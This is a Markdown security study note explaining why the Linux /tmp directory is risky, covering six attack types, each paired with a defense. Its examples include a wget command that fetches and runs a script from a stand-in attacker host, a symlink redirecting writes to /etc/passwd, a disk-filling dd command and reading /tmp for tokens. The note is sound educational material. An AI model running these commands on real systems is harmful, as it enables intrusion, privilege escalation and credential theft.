# 📁 tmp.md — The `/tmp` Directory 

## 🧠 What `/tmp` REALLY is

`/tmp` is a directory for **temporary files**

* Used by programs during execution
* Writable by **all users**
* Usually **cleared on reboot**

---

## 🧠 Key Property (VERY IMPORTANT)

```id="k1s9zp"
/tmp is world-writable
```

👉 This means:

* Any user can create files here
* Any process can use it

---

## 🧠 Why This Matters

Because:

👉 `/tmp` is a **shared space between all users and processes**

This creates:

* Trust issues
* Attack opportunities

---

# 🔐 PERMISSIONS (CRITICAL UNDERSTANDING)

Check:

```bash id="7z4r0o"
ls -ld /tmp
```

Example:

```id="0czj4l"
drwxrwxrwt
```

---

## 🧠 What is that `t` at the end?

👉 This is the **sticky bit**

### Meaning:

* Users can create files
* BUT cannot delete others’ files

---

### Example:

* User A creates file
* User B cannot delete it

---

👉 Without sticky bit → chaos (file deletion attacks)

---

# 🔐 ATTACK 1: PATH HIJACKING USING `/tmp`

## 🧠 Idea

We already saw PATH hijacking—now why `/tmp` is used:

👉 Because `/tmp` is writable

---

## ⚙️ Step-by-step

### Step 1: Attacker creates fake command

```bash id="6y1h3l"
echo 'echo hacked' > /tmp/ls
chmod +x /tmp/ls
```

---

### Step 2: Trick system or user

If PATH includes `/tmp` first:

```bash id="m9d2xt"
export PATH=/tmp:$PATH
```

---

### Step 3: Victim runs:

```bash id="2k3m8v"
ls
```

---

### Result:

* `/tmp/ls` runs instead of `/bin/ls`

---

## 🔐 Why `/tmp` is perfect for this

* Writable by anyone
* No restrictions by default

---

## 🛡️ Defense

* Never include `/tmp` in PATH
* Use full paths:

```bash id="r5o1zp"
/bin/ls
```

---

# 🔐 ATTACK 2: SYMLINK ATTACK (VERY IMPORTANT)

## 🧠 Concept: Symbolic Link

A symlink is a pointer:

```bash id="9j2wpl"
ln -s TARGET LINK
```

---

## ⚙️ Attack Scenario

### Step 1: Attacker creates symlink

```bash id="t4p8yx"
ln -s /etc/passwd /tmp/victimfile
```

---

### Step 2: Vulnerable program runs as root

It writes to:

```id="k4v8rf"
/tmp/victimfile
```

---

### What actually happens:

👉 It writes into:

```id="v4j1zm"
/etc/passwd
```

---

## 🔐 Impact

* Modify system files
* Add users
* Break authentication

---

## 🧠 Why this works

Program assumes:

* `/tmp/victimfile` is safe

But attacker redirects it

---

## 🛡️ Defense

* Use secure temp file creation (`mktemp`)
* Avoid predictable filenames
* Use proper permissions

---

# 🔐 ATTACK 3: RACE CONDITION (TOCTOU)

## 🧠 Concept

TOCTOU = Time Of Check To Time Of Use

---

## ⚙️ Scenario

Program does:

1. Checks file is safe
2. Uses file

---

### Attacker action:

Between step 1 and 2:

* Replaces file with symlink

---

## Result:

* Program acts on malicious file

---

## 🔐 Impact

* Privilege escalation
* File overwrite

---

## 🛡️ Defense

* Atomic operations
* Avoid separate check/use steps

---

# 🔐 ATTACK 4: EXECUTING MALWARE FROM `/tmp`

## 🧠 Idea

Attackers drop payloads in `/tmp`

---

## ⚙️ Example

```bash id="9z3qwe"
wget http://attacker/malware.sh -O /tmp/x.sh
chmod +x /tmp/x.sh
/tmp/x.sh
```

---

## Why `/tmp`?

* Writable
* Easy to access
* Often ignored

---

## 🔐 Impact

* Reverse shells
* Persistence
* Data exfiltration

---

## 🛡️ Defense

Mount `/tmp` with:

```id="c2m8vn"
noexec,nosuid,nodev
```

---

### Meaning:

| Option | Protection              |
| ------ | ----------------------- |
| noexec | Cannot run binaries     |
| nosuid | No privilege escalation |
| nodev  | No device files         |

---

# 🔐 ATTACK 5: DENIAL OF SERVICE (DoS)

## ⚙️ Example

```bash id="v1z8pl"
dd if=/dev/zero of=/tmp/bigfile
```

---

## What happens:

* Fills disk space
* System crashes or slows

---

## 🛡️ Defense

* Disk quotas
* Monitoring `/tmp` usage

---

# 🔐 ATTACK 6: INFORMATION LEAK

Programs store sensitive data in `/tmp`:

* Tokens
* Session data
* Temporary credentials

---

## Attack:

Attacker reads:

```bash id="3f7d4k"
cat /tmp/*
```

---

## 🔐 Impact

* Credential theft
* Session hijacking

---

## 🛡️ Defense

* Proper permissions
* Secure temp handling

---

# ⚠️ WHY `/tmp` IS DANGEROUS

Because it is:

* Shared
* Writable
* Trusted by programs

---

👉 This combination = **high-risk environment**

---

# 🛡️ DEFENSE STRATEGY

---

## 1. Secure Mount Options

```id="k2q8bm"
noexec,nosuid,nodev
```

---

## 2. Monitor `/tmp`

```bash id="x8w1dq"
ls -la /tmp
```

---

## 3. Detect Suspicious Files

* Executables
* Scripts
* SUID files

---

## 4. Clean Regularly

* Remove unused files
* Automate cleanup

---

# 🧪 RECON COMMANDS

```bash id="c8z0lm"
ls -la /tmp
find /tmp -type f
find /tmp -perm -4000 2>/dev/null
ps aux | grep /tmp
```

---

# 🧠 FINAL MENTAL MODEL

* `/tmp` = shared workspace
* Shared = untrusted
* Untrusted = dangerous

---

# 📌 FINAL TRUTH

If attacker uses `/tmp`:

* They can inject files
* They can trick programs
* They can escalate privileges
* They can run malware

👉 `/tmp` = **entry point for many exploits**
